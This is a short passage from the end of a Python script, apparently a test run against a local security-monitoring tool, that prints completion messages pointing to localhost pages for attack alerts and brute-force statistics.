    print("  All done.")
    print("  Check http://127.0.0.1:8090/attacks for alerts.")
    print("  Check http://127.0.0.1:8090/api/brute-force-stats for brute force live.")
    print("="*60)